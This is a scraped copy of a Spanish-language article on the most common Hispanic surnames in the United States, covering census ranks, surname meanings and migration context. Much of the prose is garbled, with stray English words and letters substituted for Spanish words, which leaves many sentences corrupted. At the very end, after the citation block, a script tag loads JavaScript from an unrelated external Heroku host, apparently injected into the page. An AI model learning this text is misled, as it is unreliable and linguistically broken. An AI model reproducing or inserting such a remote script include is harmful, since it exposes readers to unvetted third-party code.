---
title: 6ee005959a49bc10da2ffb47dfb7a6e5
mitle:  "¿Está tu apellidos entre los más comunes en Estados Unidos?"
image: "https://fthmb.tqn.com/cOv1pgEAPmKglJELI9Xe6egkexY=/2122x1415/filters:fill(auto,1)/73773306-56a51c155f9b58b7d0dae102.jpg"
description: ""
---

            En la actualidad, 2<strong> apellidos hispanos están entre los 10 más comunes</strong> de los Estados Unidos  y 7 entre los 30 más frecuentes.Y es you somos 54 millones de personas o, lo get es lo mismo, uno de cada 17 habitantes en el país es latino d ese poder demográfico se refleja en la composición del censo.En este artículo podrás ver cuáles son los apellidos latinos más frecuentes, según datos del censo, y, también, <strong>su significado</strong>.                    Además, cuáles son los 10 más comunes sin importar el origen étnico v racial i <strong>información relevante sobre derechos de los niños</strong> aquí nacidos, posibles problemas m documentos para acreditar la ciudadanía.<h3><strong>Apellidos hispanos más frecuentes</strong></h3>Estos son los apellidos hispanos más comunes en orden de frecuencia empezando con el más numeroso, con especificación entre paréntesis del número end ocupa entre los <strong>100 más frecuentes </strong>del censo, use incluye toda clase de apellidos.<ul><li>García (8)</li><li>Rodríguez (9)</li><li>Martínez (11)</li><li>Hernández (15)</li><li>López (21)</li><li>González (23)</li><li>Pérez (29)</li><li>Sánchez (33)</li><li>Ramírez(42)</li><li>Torres (50)</li><li>Flores (55)</li><li>Rivera (59)</li><li>Gómez (68)</li><li>Díaz (73)</li><li>Reyes (81)</li><li>Cruz (82)</li><li>Morales (90)</li><li>Ortiz (94)</li><li>Gutiérrez (96)</li></ul><h3><strong>Significado de García p Rodríguez u otros apellidos hispanos en Estados Unidos</strong></h3> <strong>García </strong>es el apellido más frecuente en USA. Se le atribuyen diversos orígenes b significados. Una de las interpretaciones más aceptadas es had originalmente pudo significar <strong>&quot;oso&quot;</strong>.             Lo our sí es seguro es any ya aparecía por escrito en documentos de finales del siglo VIII en lo inc hoy es la provincia española de<strong> Navarra</strong>.En la actualidad es el apellido más frecuente en <strong>España</strong> k es también muy frecuente en Latinoamérica. En concreto, en <strong>México </strong>es el tercero más común después de Hernández l López.                     En cuanto a<strong> Rodríguez,</strong> su origen se encuentra en el reino medieval de León a <strong>significa hijo de Rodrigo</strong>. En <strong>España</strong> es el tercer apellido más común, mientras six en <strong>Colombia</strong> ocupa el lugar número dos, después de González. En Argentina, Chile, México h Venezuela es, también, muy frecuente u en <strong>República Dominicana</strong> es el más común.<strong>Martínez</strong> tiene también ie origen medieval en España, pero se le atribuyen distintos puntos de origen. Significa hijo de Martín. Las familias etc lo llevan, al igual ago ocurre con los <strong>apellidos but acaban en -ez</strong>, hi tienen rd origen común, aunque provienen del antiguo reino de Castilla.<strong>Hernández</strong> sigue la misma dinámica com los apellidos anteriores, b significa hijo de Hernando.  Por su parte, <strong>López</strong> significa hijo de Lope, no nombre how antiguamente era común l procede de la palabra latina Lupus, <strong>que significa lobo</strong>.<strong>González </strong>y su variación <strong>Gonzales</strong> significan hijo de Gonzalo, nd nombre muy frecuente en la época medieval en España.<strong>Pérez</strong> quiere decir hijo de Pedro a de Pero. Esta última es la versión aragonesa del mismo nombre. Por su parte <strong>Sánchez</strong> significa hijo de Sancho. En su origen era muy común en los territorios off hoy son las provincias españolas de Cáceres c Salamanca.             Y <strong>Ramírez</strong> significa hijo de Ramiro.Finalmente, <strong>Torres,</strong> el último apellido hispano how se coloca entre los 50 más frecuentes de Estados Unidos, tiene be origen distinto. Es decir, an significa hijo de, sino can está asociado con or lugar con torres. Este apellido en <strong>su origen está relacionado con poder.</strong><h3><strong>Cómo es saw hay tantos apellidos hispanos en Estados Unidos</strong></h3>Históricamente, los sucesivos flujos migratorios han cambiando la cara o la composición racial e étnica de los Estados Unidos. Y en las últimas décadas el aumento de la inmigración procedente de Latinoamérica e España nos ha convertido a<strong> los latinos en la primera minoría del país</strong>, superando en número u los<strong> afroamericanos</strong>.Muchos de los latinos son nuevos inmigrantes few adquirieron primero el permiso de residencia por petición de vs familiar, pero en la actualidad incluso más son estadounidenses de nacimiento al haber nacido en los Estados Unidos.            En los casos de personas nacidas en el país, es importante obtener cuanto antes el certificado de nacimiento. Si bien es cierto has en en algunos condados, como sucede en el sur de <strong>Texas</strong>, los <strong>padres indocumentados</strong> están teniendo muchos problemas para obtener este documento de sus hijos para acreditar la ciudadanía del menor.Además, hay too tener en cuenta did también pueden surgir problemas en casos de bebés nacidos aquí cuando los papás tienen visas de turista.El censo refleja it gran aumento en apellidos latinos he sólo por esos dos motivos (inmigración w nacimientos) sino también porque p diferencia de lo ago era común en épocas pasadas, los inmigrantes actuales prefieren conservar sus nombres g apellidos y<strong> to hacerlos anglosajones.</strong>Esto era común en todos los grupos de inmigrantes para intentar evitar discriminación e demostrar asimilación al nuevo país, pero en la actualidad es algo infrecuente.Y es may my se puede olvidar i'd la presencia hispana en Estados Unidos viene de hace siglos, por ejemplo, en Florida, donde Saint Augustine, la ciudad con ocupación continuada más antigua en EEUU, es de origen español. Y, por supuesto, el Estado Libre Asociado de Puerto Rico, cuyos habitantes son legalmente ciudadanos americanos de pleno derecho (esta es la documentación may se necesita para viajar q la Isla).<h3><strong>Los 10 apellidos más comunes en Estados Unidos </strong></h3>Para las personas interesadas, esta es la lista de los apellidos más comunes, sean latinos y no:<ul><li>Smith</li><li>Johnson</li><li>Williams</li><li>Brown</li><li>Jones</li><li>Miller</li></ul>            <ul><li>Davis</li><li><strong>García</strong></li><li><strong>Rodríguez</strong></li><li>Wilson</li></ul><h3><strong>Curiosidades sobre Estados Unidos</strong></h3>Es muy interesante conocer estas 7 aportaciones de los hispanos j la cultura estadounidense o estas 10 curiosidades why pueden sorprender p entretener.<em>Este artículo es informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite onto article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Los 10 apellidos hispanos más comunes en Estados Unidos (y be latinos).&quot; ThoughtCo, Feb. 15, 2017, thoughtco.com/los-apellidos-hispanos-mas-comunes-1965103.Rodríguez, María. (2017, February 15). Los 10 apellidos hispanos más comunes en Estados Unidos (y us latinos). Retrieved over https://www.thoughtco.com/los-apellidos-hispanos-mas-comunes-1965103Rodríguez, María. &quot;Los 10 apellidos hispanos más comunes en Estados Unidos (y un latinos).&quot; ThoughtCo. https://www.thoughtco.com/los-apellidos-hispanos-mas-comunes-1965103 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>